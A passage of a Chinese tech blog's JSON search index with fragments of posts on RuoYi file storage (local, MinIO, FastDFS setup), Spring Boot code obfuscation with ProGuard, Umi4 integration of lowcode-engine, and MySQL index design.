","date":"2022-11-27","objectID":"/posts/%E5%85%B3%E4%BA%8E%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%80%9D%E8%80%83/:1:1","tags":["分布式文件"],"title":"关于分布式文件的思考","uri":"/posts/%E5%85%B3%E4%BA%8E%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%80%9D%E8%80%83/"},{"categories":["Java后端"],"content":"1、实现文件服务工厂类","date":"2022-11-27","objectID":"/posts/%E5%85%B3%E4%BA%8E%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%80%9D%E8%80%83/:1:2","tags":["分布式文件"],"title":"关于分布式文件的思考","uri":"/posts/%E5%85%B3%E4%BA%8E%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E6%80%9D%E8%80%83/"},{"categories":["Java后端","ruoyi"],"content":"分布式文件 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:0:0","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#基本介绍 什么是分布式文件 分布式文件系统是指文件系统管理的物理存储资源不一定直接连接在本地节点上，而是通过计算机网络与节点相连。 为什么要使用分布式文件 分布式文件系统是面对互联网的需求而产生，互联网时代对海量数据如何存储？靠简单的增加硬盘的个数已经满足不了我们的要求，因为硬盘传输速度有限但是数据在急剧增长，另外我们还要要做好数据备份、数据安全等。 ruoyi-file目前支持三种存储方式，本地存储、MinIO存储、FastDfs存储，可以在ruoyi-file-dev.yml配置。 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:1:0","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#本地存储 1、文件配置 # 本地文件上传 file: # 访问地址 domain: http://127.0.0.1:9300 # 本地存放的路径地址 path: D:/ruoyi/uploadPath # 映射地址 prefix: /statics 2、继承WebMvcConfigurer，重写addResourceHandlers，在registry里面配置访问路径和映射到的服务器本地路径。 package com.ruoyi.file.config; import java.io.File; import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * 通用映射配置 * * @author ruoyi */ @Configuration public class ResourcesConfig implements WebMvcConfigurer { /** * 上传文件存储在本地的根路径 */ @Value(\"${file.path}\") private String localFilePath; /** * 资源映射路径 前缀 */ @Value(\"${file.prefix}\") public String localFilePrefix; @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { /** 本地文件上传路径 */ registry.addResourceHandler(localFilePrefix + \"/**\") .addResourceLocations(\"file:\" + localFilePath + File.separator); } } 3、启动ruoyi-file应用，访问statics会被映射到本地项目D:/ruoyi/uploadPath下的目录里面。 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:2:0","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#MinIO存储 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:3:0","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#下载方式 Windows平台安装包下载 可以从https://min.io/download#/windows下载minio.exe可执行的文件。 Windows下载后新建一个目录存放minio文件，例如D:\\minioData，直接在cmd下运行minio.exe server D:\\minioData。 启动成功以后如下图，最后红色字提示修改access Key和Secret Key 提示 如果觉得官网下载慢，可以使用我分享的网盘地址: https://pan.baidu.com/s/1E9J52g6uW_VFWY34fHL6zA 提取码: vneh 打开控制台 minio`提供了一个可视化的管理控制平台，安装好之后，在浏览器中输入([http://localhost:9000/ (opens new window)](http://localhost:9000/))就可以访问了，默认的用户名和密码都是`minioadmin ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:3:1","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#如何使用 配置文件 # Minio配置 minio: url: http://127.0.0.1:9000 # 账号 accessKey: minioadmin # 密码 secretKey: minioadmin # MinIO桶名字 bucketName: ruoyi 创建桶 在后台管理界面选择+号创建你的Create Bucket，可以理解为一个文件夹用来存放图片。桶创建成功之后就可以上传图片了。 上传图片 在后台管理界面选择+号上传你的Upload file，上传你自己的图片。在文件列表的右边就可以看到图片了。 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:3:2","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#访问策略 设置* ReadOnly则所有用户通过文件路径即可访问，私有桶则不必设置访问策略。 启动ruoyi-file应用，在浏览器中打开(http://127.0.0.1:9000/ruoyi/ruoyi.png (opens new window))就可以访问图片了。 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:3:3","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#FastDfs存储 文件存储、文件同步、文件上传、文件下载等，解决了文件大容量存储和高性能访问问题。 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:4:0","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#下载方式 创建目录mkdir /home/fastdfs 1)、下载安装libfastcommon 1、下载libfastcommon v1.0.7 wget https://github.com/happyfish100/libfastcommon/archive/V1.0.7.tar.gz 2、解压libfastcommon v1.0.7 tar -xvf V1.0.7.tar.gz` cd libfastcommon-1.0.7 3、编译、安装 ./make.sh ./make.sh install 4、创建软链接 ln -s /usr/lib64/libfastcommon.so /usr/local/lib/libfastcommon.so ln -s /usr/lib64/libfastcommon.so /usr/lib/libfastcommon.so ln -s /usr/lib64/libfdfsclient.so /usr/local/lib/libfdfsclient.so ln -s /usr/lib64/libfdfsclient.so /usr/lib/libfdfsclient.so 2)、下载安装FastDFS 1、下载FastDFS wget https://github.com/happyfish100/fastdfs/archive/V5.05.tar.gz 2、解压FastDFS tar -xvf V5.05.tar.gz cd fastdfs-5.05 3、编译、安装 ./make.sh ./make.sh install 3)、配置 Tracker 服务 上述安装成功后，在/etc/目录下会有一个fdfs的目录，进入它。会看到三个.sample后缀的文件，这是作者给我们的示例文件， 我们需要把其中的tracker.conf.sample文件改为tracker.conf配置文件并修改它： cp tracker.conf.sample tracker.conf vi tracker.conf 编辑tracker.conf # 配置文件是否不生效，false 为生效 disabled=false # 提供服务的端口 port=22122 # Tracker 数据和日志目录地址 base_path=//home/data/fastdfs # HTTP 服务端口 http.server_port=80 创建tracker基础数据目录，即base_path对应的目录 mkdir -p /home/data/fastdfs 使用ln -s 建立软链接 ln -s /usr/bin/fdfs_trackerd /usr/local/bin ln -s /usr/bin/stop.sh /usr/local/bin ln -s /usr/bin/restart.sh /usr/local/bin 启动服务 service fdfs_trackerd start service fdfs_trackerd stop service fdfs_trackerd restart 查看监听 netstat -unltp|grep fdfs 如果看到22122端口正常被监听后，这时候说明Tracker服务启动成功啦！ tracker server目录及文件结构 Tracker服务启动成功后，会在base_path下创建data、logs两个目录。目录结构如下： ${base_path} |__data | |__storage_groups.dat：存储分组信息 | |__storage_servers.dat：存储服务器列表 |__logs | |__trackerd.log： tracker server 日志文件 4)、配置 Storage 服务 进入/etc/fdfs目录，复制FastDFS存储器样例配置文件storage.conf.sample，并重命名为storage.conf # cd /etc/fdfs # cp storage.conf.sample storage.conf # vi storage.conf 编辑storage.conf # 配置文件是否不生效，false 为生效 disabled=false # 指定此 storage server 所在 组(卷) group_name=group1 # storage server 服务端口 port=23000 # 心跳间隔时间，单位为秒 (这里是指主动向 tracker server 发送心跳) heart_beat_interval=30 # Storage 数据和日志目录地址(根目录必须存在，子目录会自动生成) base_p","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:4:1","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#配置Nginx 1、下载安装Nginx和fastdfs-nginx-module 安装以下的开发库: yum install readline-devel pcre-devel openssl-devel -y 2、下载fastdfs-nginx-module-1.20.tar tar -xvf fastdfs-nginx-module-1.20.tar 3、编辑fastdfs-nginx-module-1.20/src/config文件修改 vi fastdfs-nginx-module-1.20/src/config ngx_module_incs=\"/usr/include/fastdfs /usr/include/fastcommon/\" CORE_INCS=\"$CORE_INCS /usr/include/fastdfs /usr/include/fastcommon/\" 4、配置nginx安装，加入fastdfs-nginx-module模块（需要先安装好nginx） ./configure --add-module=../fastdfs-nginx-module-master/src/ 5、编译、安装 make \u0026\u0026 make install 6、查看Nginx的模块 ./nginx -v 7、复制fastdfs-nginx-module源码中的配置文件到/etc/fdfs目录，并修改 cd /home/FastDFS/fastdfs-nginx-module-1.20/src cp mod_fastdfs.conf /etc/fdfs/ # 连接超时时间 connect_timeout=10 # Tracker Server tracker_server=192.168.1.190:22122 # StorageServer 默认端口 storage_server_port=23000 # 如果文件ID的uri中包含/group**，则要设置为true url_have_group_name = true # Storage 配置的store_path0路径，必须和storage.conf中的一致 store_path0=/home/data/fastdfs/storage 8、复制FastDFS的部分配置文件到/etc/fdfs目录 cd /home/FastDFS/fastdfs-5.11/conf cp http.conf /etc/fdfs/ cp mime.types /etc/fdfs/ 9、配置nginx，修改nginx.conf： location ~/group([0-9])/M00 { ngx_fastdfs_module; } 10、启动Nginx： ./nginx ngx_http_fastdfs_set pid=11256 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:4:2","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#如何使用 1、配置文件 # FastDFS配置 fdfs: domain: http://8.129.231.12 soTimeout: 3000 connectTimeout: 2000 trackerList: 8.129.231.12:22122 启动ruoyi-file应用，调用upload上传接口后会返回一个地址，在浏览器中打开http://8.129.231.12/group1/M00/00/00/xxxx.png就可以访问图片了。 ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:4:3","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端","ruoyi"],"content":"#切换存储方式 目前默认采用的是本地存储，可以通过注解@Primary指定需要使用的文件接口。 @Primary：意思是在众多相同的bean中，优先使用用@Primary注解的bean。 1.在多数据源的时候，使用@Primary注解用于指定其中一个作为主数据源，即如果数据库操作没有指明使用哪个数据源的时候，默认使用主数据源，这个时候我们就使用到了@primary这个注解。 @Primary @Service public class LocalSysFileServiceImpl implements ISysFileService { ..... } 本地文件存储：LocalSysFileServiceImpl.java Minio 文件存储：MinioSysFileServiceImpl.java FastDFS文件存储：FastDfsSysFileServiceImpl.java ","date":"2022-11-27","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/:5:0","tags":["ruoyi","分布式文件"],"title":"Ruoyi框架之分布式文件","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6/"},{"categories":["Java后端"],"content":"SpringBoot 玩一玩代码混淆，防止反编译代码泄露 ","date":"2022-11-26","objectID":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/:0:0","tags":["代码混淆"],"title":"springboot 代码混淆，防止反编译代码泄露","uri":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["Java后端"],"content":"编译 简单就是把代码跑一哈，然后我们的代码 .java文件 就被编译成了 .class 文件 ","date":"2022-11-26","objectID":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/:1:0","tags":["代码混淆"],"title":"springboot 代码混淆，防止反编译代码泄露","uri":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["Java后端"],"content":"反编译 就是针对编译生成的 jar/war 包 里面的 .class 文件 逆向还原回来，可以看到你的代码写的啥。 比较常用的反编译工具 JD-GUI ，直接把编译好的jar丢进去，大部分都能反编译看到源码: 那如果不想给别人反编译看自己写的代码呢？ 怎么做？ ","date":"2022-11-26","objectID":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/:2:0","tags":["代码混淆"],"title":"springboot 代码混淆，防止反编译代码泄露","uri":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["Java后端"],"content":"混淆 该篇玩的代码混淆 ，是其中一种手段。 我给你看，但你反编译看到的不是真正的代码。 先看一张效果示例图 ： 开搞 ","date":"2022-11-26","objectID":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/:3:0","tags":["代码混淆"],"title":"springboot 代码混淆，防止反编译代码泄露","uri":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["Java后端"],"content":"正文 先看一下我们混淆一个项目代码，要做啥？ ","date":"2022-11-26","objectID":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/:4:0","tags":["代码混淆"],"title":"springboot 代码混淆，防止反编译代码泄露","uri":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["Java后端"],"content":"一共就两步 第一步， 在项目路径下，新增一份文件 proguard.cfg ： proguard.cfg #指定Java的版本 -target 1.8 #proguard会对代码进行优化压缩，他会删除从未使用的类或者类成员变量等 -dontshrink #是否关闭字节码级别的优化，如果不开启则设置如下配置 -dontoptimize #混淆时不生成大小写混合的类名，默认是可以大小写混合 -dontusemixedcaseclassnames # 对于类成员的命名的混淆采取唯一策略 -useuniqueclassmembernames #混淆时不生成大小写混合的类名，默认是可以大小写混合 -dontusemixedcaseclassnames #混淆类名之后，对使用Class.forName('className')之类的地方进行相应替代 -adaptclassstrings #对异常、注解信息予以保留 -keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,EnclosingMethod # 此选项将保存接口中的所有原始名称（不混淆）--\u003e -keepnames interface ** { *; } # 此选项将保存所有软件包中的所有原始接口文件（不进行混淆） #-keep interface * extends * { *; } #保留参数名，因为控制器，或者Mybatis等接口的参数如果混淆会导致无法接受参数，xml文件找不到参数 -keepparameternames # 保留枚举成员及方法 -keepclassmembers enum * { *; } # 不混淆所有类,保存原始定义的注释- -keepclassmembers class * { @org.springframework.context.annotation.Bean *; @org.springframework.beans.factory.annotation.Autowired *; @org.springframework.beans.factory.annotation.Value *; @org.springframework.stereotype.Service *; @org.springframework.stereotype.Component *; } #忽略warn消息 -ignorewarnings #忽略note消息 -dontnote #打印配置信息 -printconfiguration -keep public class com.example.myproguarddemo.MyproguarddemoApplication { public static void main(java.lang.String[]); } 注意点： 其余的看注释，可以配置哪些类不参与混淆，哪些枚举保留，哪些方法名不混淆等等。 第二步，在pom文件上 加入proguard 混淆插件 ： build标签里面改动加入一下配置 \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003ecom.github.wvengen\u003c/groupId\u003e \u003cartifactId\u003eproguard-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e2.6.0\u003c/version\u003e \u003cexecutions\u003e \u003c!-- 以下配置说明执行mvn的package命令时候，会执行proguard--\u003e \u003cexecution\u003e \u003cphase\u003epackage\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003eproguard\u003c/goal\u003e \u003c/goals\u003e \u003c/execution\u003e \u003c/executions\u003e \u003cconfiguration\u003e \u003c!-- 就是输入Jar的名称，我们要知道，代码混淆其实是将一个原始的jar，生成一个混淆后的jar，那么就会有输入输出。 --\u003e \u003cinjar\u003e${project.build.finalName}.jar\u003c/injar\u003e \u003c!-- 输出jar名称，输入输出jar同名的时候就是覆盖，也是比较常用的配置。 --\u003e \u003coutjar\u003e${project.build.finalName}.jar\u003c/outjar\u003e \u003c!-- 是否混淆 默认是true --\u003e \u003cobfuscate\u003etrue\u003c/obfuscate\u003e \u003c!-- 配置一个文件，通常叫做proguard.cfg,该文件主要是配置options选项，也就是说使用proguard.cfg那么options下的所有内容都","date":"2022-11-26","objectID":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/:4:1","tags":["代码混淆"],"title":"springboot 代码混淆，防止反编译代码泄露","uri":"/posts/springboot-%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E9%98%B2%E6%AD%A2%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"categories":["LowCode"],"content":"Umi4 集成阿里低代码框架lowcode-engine 携手创作，共同成长！这是我参与「掘金日新计划 · 8 月更文挑战」的第2天，点击查看活动详情 ","date":"2022-11-26","objectID":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/:0:0","tags":["Umi4","lowcode-engine"],"title":"Umi4 集成阿里低代码框架lowcode-engine","uri":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/"},{"categories":["LowCode"],"content":"前言 最近准备研究下阿里低代码框架lowcode-engine, 官方Demo是提供好的脚手架，由于我们的框架使用的是umi，官方文档提供了一些教程，在此记录下在umi4集成lowcode-engine. ","date":"2022-11-26","objectID":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/:1:0","tags":["Umi4","lowcode-engine"],"title":"Umi4 集成阿里低代码框架lowcode-engine","uri":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/"},{"categories":["LowCode"],"content":"实现 搭建umi4项目 1.通过官方文档的快速开始，我们可以快速创建出项目 先找个地方建个空目录 mkdir myapp \u0026\u0026 cd myapp 复制代码 通过官方工具创建项目, 这里我们采用pnpm包管理工具 $ pnpm dlx create-umi@latest ✔ Install the following package: create-umi? (Y/n) · true ✔ Pick Npm Client › pnpm ✔ Pick Npm Registry › taobao Write: .gitignore Write: .npmrc Write: .umirc.ts Copy: layouts/index.tsx Write: package.json Copy: pages/index.tsx Copy: pages/users.tsx Copy: pages/users/foo.tsx \u003e @ postinstall /private/tmp/sorrycc-vylwuW \u003e umi setup info - generate files 复制代码 创建完成后，安装依赖, 执行 pnpm dev就可以看到我们的项目启动起来了。 集成lowcode-engine 引入UMD包, 我们在 .umirc.ts中配置externals,styles和scripts externals: { 'react': 'var window.React', 'react-dom': 'var window.ReactDOM', 'prop-types': 'var window.PropTypes', '@alifd/next': 'var window.Next', '@alilc/lowcode-engine': 'var window.AliLowCodeEngine', '@alilc/lowcode-editor-core': 'var window.AliLowCodeEngine.common.editorCabin', '@alilc/lowcode-editor-skeleton': 'var window.AliLowCodeEngine.common.skeletonCabin', '@alilc/lowcode-designer': 'var window.AliLowCodeEngine.common.designerCabin', '@alilc/lowcode-engine-ext': 'var window.AliLowCodeEngineExt', '@ali/lowcode-engine': 'var window.AliLowCodeEngine', 'moment': 'var window.moment', 'lodash': 'var window._', }, styles: [ 'https://alifd.alicdn.com/npm/@alilc/lowcode-engine@latest/dist/css/engine-core.css', 'https://g.alicdn.com/code/lib/alifd__next/1.23.24/next.min.css', 'https://alifd.alicdn.com/npm/@alifd/theme-lowcode-light/0.2.0/next.min.css', 'https://alifd.alicdn.com/npm/@alilc/lowcode-engine-ext@latest/dist/css/engine-ext.css' ], scripts: [ { src: 'https://g.alicdn.com/code/lib/react/18.0.0/umd/react.development.js', defer: false, }, { src: 'https://g.alicdn.com/code/lib/react-dom/18.0.0/umd/react-dom.development.js', defer: false, }, { src: 'https://g.alicdn.com/code/lib/prop-types/15.7.2/prop-types.js', defer: false, }, { src: 'https://g.alicdn.com/platform/c/react15-polyfill/0.0.1/dist/index.js', defer: false, }, { src: 'https://g.alicdn.com/platform/c/lodash/4","date":"2022-11-26","objectID":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/:2:0","tags":["Umi4","lowcode-engine"],"title":"Umi4 集成阿里低代码框架lowcode-engine","uri":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/"},{"categories":["LowCode"],"content":"结束语 代码已上传到github,请查看mi4-lowcode-app。 ","date":"2022-11-26","objectID":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/:3:0","tags":["Umi4","lowcode-engine"],"title":"Umi4 集成阿里低代码框架lowcode-engine","uri":"/posts/umi4-%E9%9B%86%E6%88%90%E9%98%BF%E9%87%8C%E4%BD%8E%E4%BB%A3%E7%A0%81%E6%A1%86%E6%9E%B6lowcode-engine/"},{"categories":["数据库"],"content":" (五)MySQL索引应用篇：建立索引的正确姿势与使用索引的最佳指南！ ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:0:0","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"引言 数据库索引，绝对是MySQL的核心功能之一，如果没有索引机制的数据库，那数据的检索效率绝对是令人无法接受的，毕竟没有索引的表数据，就如同一个普通的文本文件存储在磁盘中。在《索引上篇》中，我们对于MySQL提供的索引机制，从引入，到创建、使用、分类、管理….等进行了全面阐述，相信经过上一篇的讲解后，大家对MySQL索引机制建立了系统化的认知，而本篇则会以上篇为基础，对索引机制进一步加深掌握。 不过在上篇中虽对数据库索引机制有了完善认知，但还不够，因为上篇仅是单纯的认知阶段，能否真正的在实际项目中运用好索引机制，还需要具备丰富的经验以及一些原则与方法论，比如下述一些关于索引的问题： 索引虽然能给MySQL检索数据的效率带来质的飞跃，但加入索引未带来新问题吗？ 既然索引能够提升查询性能，那是不是为表中每个字段建立索引，性能会更好？ 一张数据表中，那些类型的字段不适合建立索引呢？又是因为什么原因呢？ 表中会存在大量的字段，但其中那些字段建立索引才能够最大的性能收益呢？ MySQL提供的索引种类也不少，一个字段上建立什么类型的索引才最好呢？ 当表中存在多个索引时，一条查询SQL有多条路径可走，此时走哪条索引最好？ ....... 对于这些问题，如果仅靠上篇索引的知识，相信是很难回答具体的，那在本篇中，则重点讲解索引应用相关的方式方法，例如各索引优劣分析、建立索引的原则、使用索引的指南以及索引失效与索引优化等内容。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:1:0","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"一、MySQL各索引的优劣分析 首先来聊聊索引机制带来的利害关系，有句古话曾说过：“凡事有利必有弊”，而MySQL的索引机制也不例外，引入索引机制后，能够给数据库带来的优势很明显： ①整个数据库中，数据表的查询速度直线提升，数据量越大时效果越明显。 ②通过创建唯一索引，可以确保数据表中的数据唯一性，无需额外建立唯一约束。 ③在使用分组和排序时，同样可以显著减少SQL查询的分组和排序的时间。 ④连表查询时，基于主外键字段上建立索引，可以带来十分明显的性能提升。 